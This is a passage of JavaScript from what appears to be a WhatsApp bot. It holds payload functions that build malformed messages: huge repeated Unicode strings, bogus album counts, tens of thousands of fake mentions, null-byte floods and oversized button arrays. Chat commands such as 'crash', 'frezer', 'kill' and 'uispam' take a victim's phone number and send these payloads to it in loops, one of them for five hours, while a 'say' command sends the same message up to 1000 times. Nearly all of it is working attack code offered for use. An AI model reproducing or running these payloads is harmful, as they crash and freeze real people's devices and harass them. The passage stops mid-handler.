                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await XeonBotInc.relayMessage(target, message, {
      participant: { jid: target },
    });
    }
  } catch (err) {
    console.log(err);
  }
}
async function interactiveCall(target) {
  try {
    for (let i = 0; i < 10; i++) {
      const msg = await generateWAMessageFromContent(target, proto.Message.fromObject({
        interactiveMessage: {
          body: {
            text: `你好混蛋我在这里/${"ꦾ".repeat(100)}`
          },
          nativeFlowMessage: {
            buttons: [
              { name: 'single_select', buttonParamsJson: '{}' },
              { name: 'call_permission_request', buttonParamsJson: '{"status":true}' },
              { name: 'mpm_1', buttonParamsJson: '{"status":true}' },
              { name: 'mpm_2', buttonParamsJson: '{"status":true}' },
              { name: 'mpm_3', buttonParamsJson: '{"status":true}' },
              { name: 'mpm_4', buttonParamsJson: '{"status":true}' }
            ],
            messageParamsJson: '{}'
          },
          contextInfo: {
            forwardingScore: 999,
            isForwarded: true,
            groupMentions: [
              { groupJid: "1@newsletter", groupSubject: "RxhL" }
            ]
          }
        }
      }), { userJid: target, quoted: null });

      await XeonBotInc.relayMessage(target, msg.message, { participant: { jid: target } });
    }
  } catch (error) {
    console.error("Error in interactiveCall:", error);
  }
}
    //==============================================================\\
    async function chatFrezze(target) {
const fakeKey = {
    "remoteJid": target,
    "fromMe": true,
    "id": await XeonBotInc.relayMessage(target, {
        "albumMessage": {
            "expectedImageCount": -99999999,
            "expectedVideoCount": 0,
            "caption": "x"
        }
    },{participant:{jid:target}})
}
let xx = {"url": "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQN0oZNr6-kfN5YWoC1cdu2hEJ4VBgXpp41NeQkRtkVb2lDTyjBL4J8yMMfYgJ0YWZRgZdiUzCqAV5EYTeq7FcaysmAPj53twFH-dr0e4Q?ccb=9-4&oh=01_Q5Aa2AEnGl7IbMFtdCLGyFb8_d08Q7WVgIUC193324MQoouEiA&oe=68A159D3&_nc_sid=e6ed6c&mms3=true","mimetype": "image/jpeg","fileSha256": "l5PXVvy1P0tnS0y8+eg0AwS4og/GLOuSW0OI/ZDgZEE=","fileLength": "367077","height": 1395,"width": 1200,"mediaKey": "rTYEhP0o5UbHDasXyfvpsAgXsh3SNnsPQKzoPKQ50gw=","fileEncSha256": "6tK2h/KEpqgW5W5Qx9SnmBhZpSs4Y6V2Ac7UoDjdSvY=","directPath": "/o1/v/t24/f2/m238/AQN0oZNr6-kfN5YWoC1cdu2hEJ4VBgXpp41NeQkRtkVb2lDTyjBL4J8yMMfYgJ0YWZRgZdiUzCqAV5EYTeq7FcaysmAPj53twFH-dr0e4Q?ccb=9-4&oh=01_Q5Aa2AEnGl7IbMFtdCLGyFb8_d08Q7WVgIUC193324MQoouEiA&oe=68A159D3&_nc_sid=e6ed6c"}
for (let s = 0; s < 2; s++) {
const xy = generateWAMessageFromContent(target, proto.Message.fromObject({
"botInvokeMessage": {
"message": {
    "messageContextInfo": {
        "messageSecret": (0, crypto.randomBytes)(32),
        "messageAssociation": {
            "associationType": "MEDIA_ALBUM",
            "parentMessageKey": fakeKey
        }
    },
"imageMessage": xx
}
}
}),{participant:{jid:target}})
const xz = await XeonBotInc.relayMessage(target, xy.message, {messageId:xy.key.id,participant:{jid:target}})
xx.caption = "𑲱".repeat(100000);
XeonBotInc.relayMessage(target, {
"protocolMessage": {
    "type": "MESSAGE_EDIT",
    "key": {
        "fromMe": true,
        "remoteJid": target,
        "id": xz
    },
    "editedMessage": {
        "imageMessage": xx
    }
}
},{participant:{jid:target}})
await sleep(100)
}
}
    //==============================================================\\
    async function sendCarouselCrash(targetJid) {
    const carouselContent = {
        carouselMessage: {
            cards: [
                {
                    jpegThumbnail: 'https://i.ibb.co/ydRKHnw/thumb.jpg',
                    carouselCard: {
                        body: "T-Яyuichi",
                        buttons: [
                            {
                                buttonId: "id1",
                                buttonText: { displayText: "Y" },
                                type: "RESPONSE"
                            }
                        ],
                        header: {
                            imageMessage: { jpegThumbnail: 'https://i.ibb.co/ydRKHnw/thumb.jpg' },
                            title: "Crash Sletter ~ " + "�?".repeat(614) + " " + "𑲭𑲭".repeat(2500)
                        },
                        productMessage: {
                            businessOwnerJid: "0@s.whatsapp.net",
                            product: { productId: "1" }
                        }
                    }
                }
            ]
        }
    };

    const msg = generateWAMessageFromContent(targetJid, carouselContent, {
        userJid: XeonBotInc.user.id
    });

    await XeonBotInc.relayMessage(targetJid, msg.message, {
        messageId: msg.key.id
    });
}
    //==============================================================\\
async function sendBugGC(targetJid) {
    await XeonBotInc.sendMessage(
        targetJid,
        {
            text: "饝箔饝箔饾悡饾悁饾悓饾悁饪火潗戰潗橉潗傗炕驴? " + '軎�'.repeat(614) + " " + '饝箔饝箔'.repeat(2500),
            contextInfo: {
                mentionedJid: ["0@s.whatsapp.net", ...participant.map(p => p.id)],
                groupMentions: [],
                isForwarded: true,
                forwardingScore: 99999999,
                remoteJid: targetJid,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363047769145354@newsletter',
                    newsletterName: 'T-携yuichi',
                    serverMessageId: 143
                }
            }
        },
        {
            quoted: {
                key: {
                    fromMe: false,
                    participant: "0@s.whatsapp.net",
                    remoteJid: "0@s.whatsapp.net"
                },
                message: {}
            }
        }
    );
}
//==============================================================\\
async function groupBlank(target) {
  XeonBotInc.relayMessage(target, {
    newsletterAdminInviteMessage: {
      newsletterJid: "01096379348@newsletter",
      newsletterName: "᭡꧈".repeat(100000),
      caption: "p" + "\u0000".repeat(10000),
      inviteExpiration: "0",
    },
  }, {
    participant: { jid: target }
  })
  
  console.log("Succes Send")
}
//==============================================================\\
async function guatrainvi(target, mention) {

  const imageCrash = "https://mega.nz/file/DtgDBAZK#TvUFm5Vzu81o1HinHpo0f5UK_4MJ_z0zoN3rUmX5GVY";

  const mentionedMetaAi = [
    "13135550001@s.whatsapp.net",
    "01096379348@s.whatsapp.net",
    "13135550003@s.whatsapp.net",
    "13135550004@s.whatsapp.net",
    "13135550005@s.whatsapp.net",
    "13135550006@s.whatsapp.net",
    "13135550007@s.whatsapp.net",
    "13135550008@s.whatsapp.net",
    "13135550009@s.whatsapp.net",
    "13135550010@s.whatsapp.net"
  ];

  const photo = {
    image: { url: imageCrash },
    caption: "GMOTEJID     >  @w@'" 
             + "\n".repeat(5)
             + "ꦾ".repeat(60000)
  };

  const album = await generateWAMessageFromContent(target, {
    albumMessage: {
      expectedImageCount: 999,
      expectedVideoCount: 666
    }
  }, {
    userJid: target,
    upload: XeonBotInc.waUploadToServer
  });

  await XeonBotInc.relayMessage(target, album.message, { messageId: album.key.id });

  for (let i = 0; i < 666; i++) {
    const msg = await generateWAMessage(target, photo, {
      upload: XeonBotInc.waUploadToServer
    });

    const type = Object.keys(msg.message).find(t => t.endsWith('Message'));

    msg.message[type].contextInfo = {
      mentionedJid: [
        ...mentionedMetaAi,
        ...Array.from({ length: 30000 }, () =>
          `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
      ],
      businessMessageForwardInfo: {
        businessOwnerJid: "01096379348@s.whatsapp.net"
      },
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      forwardedNewsletterMessageInfo: {
        newsletterName: "ꦾ".repeat(100),
        newsletterJid: "120363330344810280@newsletter",
        serverMessageId: 999
      },
      messageAssociation: {
        associationType: 1,
        parentMessageKey: album.key
      }
    };
   msg.message.nativeFlowMessage = {
  buttons: [
    {
      name: "single_select",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    },
    {
      name: "call_permission_request",
      buttonParamsJson: JSON.stringify({
        status: true,
      }),
    },
    ...Array(99999).fill().map(() => ({
      name: "mpm",
      buttonParamsJson: "",
    })),
  ],
  messageParamsJson: "[{".repeat(10000),
};
    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                { tag: "to", attrs: { jid: target }, content: undefined }
              ]
            }
          ]
        }
      ]
    });

    if (mention) {
      await XeonBotInc.relayMessage(target, {
        statusMentionMessage: {
          message: { protocolMessage: { key: msg.key, type: 25 } }
        }
      }, {
        additionalNodes: [
          { tag: "meta", attrs: { is_status_mention: "true" }, content: undefined }
        ]
      });
    }
  }
}
//==============================================================\\
async function robustfreeze(target, Ptcp = true) {
  try {
    await XeonBotInc.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "BODY here 👁⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝‌\n" +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
//==============================================================\\
async function InvisDelay(target, mention = true) {
    const generateMessage = {
        viewOnceMessage: {
            message: {
                audioMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7114-24/30660994_671452705709185_1216552849572997529_n.enc?ccb=11-4&oh=01_Q5Aa1gEtxyMxg-3KsoTrQJTn_0975yQMi4MrLxKv0Us-Yl2nBg&oe=685F9977&_nc_sid=5e03e0&mms3=true",
                    mimetype: "audio/mpeg",
                    fileSha256: Buffer.from("aP7OzjZYQeT/660AyijlPDU+03vMOl4UJHg6qFU3lOM=", "base64"),
                    fileLength: 99999999999,
                    seconds: 24,
                    ptt: false,
                    mediaKey: Buffer.from("WQfLoSWy9BRY4dykp/MiEvFpgf2Gt+dJFswJ8hoVz6A=", "base64"),
                    fileEncSha256: Buffer.from("03TYnSxt5tzyF42T/K/cpg2DqP3FsQ0rN0u3q31iUMU=", "base64"),
                    directPath: "/v/t62.7114-24/30660994_671452705709185_1216552849572997529_n.enc?ccb=11-4&oh=01_Q5Aa1gEtxyMxg-3KsoTrQJTn_0975yQMi4MrLxKv0Us-Yl2nBg&oe=685F9977&_nc_sid=5e03e0",
                    mediaKeyTimestamp: 1748513902,
                    contextInfo: {
                        mentionedJid: Array.from({ length: 40000 }, () =>
                            "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                        ),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        text: "SASUKE KILL YOUU" + "".repeat(10000),
                        forwardedNewsletterMessageInfo: {
                            newsletterName: "XyzzZz",
                            newsletterJid: "120363309802495518@newsletter",
                            serverMessageId: 1
                        },
                        businessMessageForwardInfo: {
                            businessOwnerJid: "5521992999999@s.whatsapp.net"
                        },
                        nativeFlowResponseMessage: {
                            name: "� ErlanggaOfficial",
                            paramsJson: "\u0000".repeat(999999)
                        },
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/octet-stream",
                            fileSha256: Buffer.from("4c69bbca7b6396dd6766327cc0b13fc64b97c581442eea626c3919643f3793c4", "hex"),
                            fileEncSha256: Buffer.from("414942a0d3204ae71b4585ae1dedafcc8ad2a14687fa9cbbcde3efb5a4ac86a9", "hex"),
                            fileLength: 99999999999,
                            mediaKey: Buffer.from("4b2d315efbdfea6d69ffdd6ce80ae57fa90ddcd8935b897d85ba29ef15674371", "hex"),
                            fileName: "� ErlanggaOfficial",
                            mediaKeyTimestamp: 1748420423,
                            directPath: "/v/t62.7119-24/13158749_1750335815519895_6021414070433962213_n.enc?ccb=11-4&oh=01_Q5Aa1gE7ilsZ_FF3bjRSDrCYZWbHSHDUUnqhdPHONunoKyqDNQ&oe=685E3E69&_nc_sid=5e03e0"
                        }
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await XeonBotInc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await XeonBotInc.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "Erlangga - INVISIBLE" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
//==============================================================\\
async function dksk(target) {

  const mentionedList = [
        "01096379348@s.whatsapp.net",
        "phynx@agency.whatsapp.biz",
        ...Array.from({ length: 35000 }, () =>
            `1${Math.floor(Math.random() * 50000000)}@s.whatsapp.net`
        )
    ];
    
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
          messageSecret: crypto.randomBytes(32),
          supportPayload: JSON.stringify({
            version: 2,
            is_ai_message: true,
            should_show_system_message: true,
            ticket_id: crypto.randomBytes(16)
          })
        },
        interactiveMessage: {
          body: { 
            text: 'GMOTEJID     >  @w@' 
          },
          footer: { 
            text: 'GMOTEJID     >  @w@' 
          },
          carouselMessage: {
            cards: [
              {               
                header: {
                  title: '',
                  imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    fileSha256: "ydrdawvK8RyLn3L+d+PbuJp+mNGoC2Yd7s/oy3xKU6w=",
                    fileLength: Math.floor(99.99 * 1073741824).toString(),
                    height: 999,
                    width: 999,
                    mediaKey: "2saFnZ7+Kklfp49JeGvzrQHj1n2bsoZtw2OKYQ8ZQeg=",
                    fileEncSha256: "na4OtkrffdItCM7hpMRRZqM8GsTM6n7xMLl+a0RoLVs=",
                    directPath: "/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1749172037",
                    jpegThumbnail: null,
                    scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                    scanLengths: [8596, 155493],
                    annotations: [
                        {
                           embeddedContent: {
                             embeddedMusic: {
                               musicContentMediaId: "1",
                                 songId: "peler",
                                 author: ".RaldzzXyz",
                                 title: "PhynxAgency",
                                 artworkDirectPath: "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                                 artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                                 artworkEncSha256: "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                                 artistAttribution: "https://www.instagram.com/_u/raldzzxyz_",
                                 countryBlocklist: true,
                                 isExplicit: true,
                                 artworkMediaKey: "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ="
                               }
                             },
                           embeddedAction: true
                         }
                       ]
                     },
                   hasMediaAttachment: true, 
                 },
                body: { 
                  text: ""
                },
                footer: {
                  text: ""
                },
                nativeFlowMessage: {
                  messageParamsJson: "{".repeat(90000)
                }
              }
            ]
          },
contextInfo: {
            participant: target,
            remoteJid: target,
            stanzaId: XeonBotInc.generateMessageTag(),
            mentionedJid: mentionedList,
             quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: {
                      text: "Sent",
                      format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                      name: "galaxy_message",
                      paramsJson: JSON.stringify({
                        header: " ",
                        body: " ",
                        flow_action: "navigate",
                        flow_action_payload: { screen: "FORM_SCREEN" },
                        flow_cta: "Grattler",
                        flow_id: "1169834181134583",
                        flow_message_version: "3",
                        flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
                      }),
                      version: 3
                    }
                  }
                }
              }
            },
          }
        }
      }
    }
  }, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}
            //==============================================================\\

if (m.message) {

    // Log the message details
    console.log(
        chalk.black(chalk.bgWhite('[ MESSAGE ]')),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' +
        chalk.magenta('=> FROM'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' +
        chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Private Chat', from)
    );
}

switch(command) {
/*case 'xjxjxjxoke': {
	let audiobuffy = fs.readFileSync(`./oke.mp3`)
	XeonBotInc.sendMessage('919863235489@s.whatsapp.net', { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true })     
	}
	k*/
case 'crash':
case 'infinity': {


if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "919366316011") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
  for (let i = 0; i <1; i++) {
await crashmsg(Xreturn);
await chatFrezz0e(Xreturn);
await crashmsg(Xreturn);
}
}
break
    
    case 'say': {
    let textMsg = m.text || "";

    // لو فيه prefix، نشيله
    if (textMsg.startsWith(prefix)) {
        textMsg = textMsg.slice(prefix.length).trim();
    }

    const parts = textMsg.split(/\s+/);

    let count, message;

    // صيغة 1: آخر كلمة = say
    if (parts[parts.length - 1].toLowerCase() === 'say') {
        count = parseInt(parts[parts.length - 2]);
        message = parts.slice(0, -2).join(' ');
    }
    // صيغة 2: أول كلمة = say
    else if (parts[0].toLowerCase() === 'say') {
        count = parseInt(parts[1]);
        message = parts.slice(2).join(' ');
    }
    // صيغة 3: الكلمة الثانية = say
    else {
        const sayIndex = parts.findIndex(p => p.toLowerCase() === 'say');
        if (sayIndex === -1) return replygcxeon('❌ الأمر لازم يحتوي على say');
        if (sayIndex === 0) { // handled above
            count = parseInt(parts[1]);
            message = parts.slice(2).join(' ');
        } else { 
            count = parseInt(parts[sayIndex - 1]);
            message = parts.slice(0, sayIndex - 1).concat(parts.slice(sayIndex + 1)).join(' ');
        }
    }

    // تحقق من العدد والرسالة
    if (isNaN(count) || count < 1 || count > 1000) return replygcxeon('❌ العدد لازم يكون من 1 لـ 1000');
    if (!message) return replygcxeon('❌ اكتب رسالة');

    replygcxeon(`✅ Sending "${message}" عدد ${count} مرة`);

    // ارسال الرسائل
    for (let i = 0; i < count; i++) {
        await XeonBotInc.sendMessage(m.chat, { text: message });
        await new Promise(resolve => setTimeout(resolve, 300));
    }
}
break;

case 'frezer':
case 'frezerchat': {


if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "919366316011") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
  for (let i = 0; i <3; i++) {
await chatFrezz0e(Xreturn);
await chatFrezz0e(Xreturn);
await chatFrezz0e(Xreturn);
}
}
break
    case 'crash_homev2': {
  
  if (!q) return replygcxeon(`*exemplo:*\n\n*${prefix + command}* '+55 51 8992-91'`);
  
  let victim = text.split("|")[0];
  const Xreturn = m.mentionedJid?.[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'') + "@s.whatsapp.net";
  var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  
  if (victim == "+55 9999-9999") {
    return;
  }
  if (victim == "5599999999") {
    return;
  }
  if (victim == "5599999999") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("esse número não existe");
  }  
  sendMessageWithMentions(
    `*alvo:* ${Xreturn.split('@')[0]}`,
    [Xreturn]
       );
      async function Crashv2(target) {
       try {
      const messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
      
        "interactiveMessage": {
          "header": {
            "hasMediaAttachment": false,
            "videoMessage": {
              "url": "https://mmg.whatsapp.net/v/t62.7161-24/509496646_2846413155553052_1139979200251409729_n.enc?ccb=11-4&oh=01_Q5Aa1wHq2E-dQ6An_YBy1f5yx4vwvarpe6_jra-NYfSyQHb5BQ&oe=68928F96&_nc_sid=5e03e0&mms3=true",
              "mimetype": "video/mp4",
              "fileSha256": "vYNZrOAR6WiBX8bs8p+tPPwUsoCLMoaWXEP/I/ffJxM=",
              "fileLength": "24202",
              "mediaKey": "OWu+m/nbwn6KSO8Z+jq+jYL1uUHPW2wli6rRAcyztDQ=",
              "fileEncSha256": "7qFwdjf6IQmupG7H1OO4Ai0HAm1gmAZLo6HKHWpFKqs=",
              "directPath": "/v/t62.7161-24/509496646_2846413155553052_1139979200251409729_n.enc?ccb=11-4&oh=01_Q5Aa1wHq2E-dQ6An_YBy1f5yx4vwvarpe6_jra-NYfSyQHb5BQ&oe=68928F96&_nc_sid=5e03e0",
              "mediaKeyTimestamp": "1751845138"
            }
          },
          "body": {
            "text": "HX     >  @w@"
          },
          "nativeFlowMessage": {
            "buttons": [
              {
                "name": "galaxy_message",
                "buttonParamsJson": "{\"flow_message_version\":\"4\",\"flow_id\":\"695542649920202\",\"flow_action_payload\":{\"screen\":\"contact_details\",\"data\":{\"full_name_visible\":true,\"phone_number_visible\":true,\"email_visible\":false,\"cpf_or_cnpj_visible\":false,\"delivery_address_visible\":false}},\"well_version\":\"V700\",\"flow_cta\":\"__localize:FLOWS_ADD_INFO_BUTTON_TITLE\",\"flow_action\":\"navigate\",\"flow_token\":\"Q1VTVE9NRVJfSU5GTw==\"}"
              },
              {
                              "name": "galaxy_message",
                "buttonParamsJson": "{\"flow_message_version\":\"4\",\"flow_id\":\"695542649920202\",\"flow_action_payload\":{\"screen\":\"contact_details\",\"data\":{\"full_name_visible\":true,\"phone_number_visible\":true,\"email_visible\":false,\"cpf_or_cnpj_visible\":false,\"delivery_address_visible\":false}},\"well_version\":\"V700\",\"flow_cta\":\"__localize:FLOWS_ADD_INFO_BUTTON_TITLE\",\"flow_action\":\"navigate\",\"flow_token\":\"Q1VTVE9NRVJfSU5GTw==\"}"
              },
              {
                                   
                "name": "galaxy_message",
                "buttonParamsJson": "{\"flow_message_version\":\"4\",\"flow_id\":\"595640013604952\",\"flow_action_payload\":{\"screen\":\"contact_details\",\"data\":{\"full_name_visible\":true,\"phone_number_visible\":true,\"email_visible\":true,\"offer_name\":\"teste\",\"offer_description\":\"teste b4u\"}},\"well_version\":\"V700\",\"flow_cta\":\"__localize:FLOWS_SIGN_UP_BUTTON_TITLE\",\"flow_action\":\"navigate\",\"flow_token\":\"T0ZGRVJfU0lHTlVQ\"}"
              }
            ],
            "messageParamsJson": "{{{{{".repeat(4000),
            "messageVersion": 3
          },
          "contextInfo": {
            "expiration": 0,
            "ephemeralSettingTimestamp": "1750461178",
            "externalAdReply": {
              "body": "HX     >  @w@",
              "mediaType": "IMAGE",
              "sourceType": "whatsapp",
              "sourceId": "828593474",
              "sourceUrl": "https://www.youtube.com/@gutoxtazv9",
              "ctwaClid": "clid258391",
              "ref": "referencia"
            },
            "disappearingMode": {
              "initiator": "CHANGED_IN_CHAT",
              "trigger": "UNKNOWN",
              "initiatedByMe": false
            }
          }
        }
        }), { participant: { jid: target } });

      await guBeta(target, messageContent);
    } catch (e) {
      console.log(e);
    }
  }

  async function guBeta(isTarget, msg) {
    await XeonBotInc.relayMessage(isTarget, msg.message, {
      participant: { jid: isTarget },
      messageId: msg.key.id
    });
  }
  for (let i = 0; i < 10; i++) {
  await Crashv2(Xreturn);
  }
}
break;    
        
case 'kill':
case 'crash':
case 'JOKER':
case 'xnxx': {


if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "919366316011") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
  for (let i = 0; i <10; i++) {
      await callCrash(Xreturn);
      await sleep(350);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
      await sleep(300);
      await callCrash(Xreturn);
}
}
break

case 'uispam': case 'fcspambeta': {

if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
  
sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
  [Xreturn]
);
const FIVE_HOURS = 5 * 60 * 60 * 1000; // 5 hours in milliseconds
    const startTime = Date.now();

    while (Date.now() - startTime < FIVE_HOURS) {
    try {
    	await Uitoya(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
    	await sleep(1000);
    	await callCrash(Xreturn);
        await sleep(1000);
        await crashmsg(Xreturn);
    } catch (err) {
        if (
            err?.output?.statusCode === 428 ||
            err?.output?.statusCode === 408 ||
            err.message.includes('Connection Closed') ||
            err.message.includes('Timed Out') ||
            err.code === 'ECONNABORTED'
        ) {
            console.log(`⚠️Bug ${command} ended for ${Xreturn} ✅`);
            break;
        }
    }
   //
}
}
break
	
	case 'xxxxbetakill': {

if (!q) return replygcxeon(`Example:\n ${prefix + command} 20XXX`)
victim = text.split("|")[0]
const Xreturn = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
var contactInfo = await XeonBotInc.onWhatsApp(Xreturn);
  if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
    }
    if (victim == "201286008203") {
    return;
  }
  if (contactInfo.length == 0) {
    return replygcxeon("The number is not registered on WhatsApp");
  }
sendMessageWithMentions(
  `✅ BUG SENT SUCCESSFULLY 🚀
🎯 Target: ${Xreturn.split('@')[0]}\n\n\n\n\n\n\n\n\n\n
👨🏻‍💻 From: ${m.sender.split('@')[0]}`,
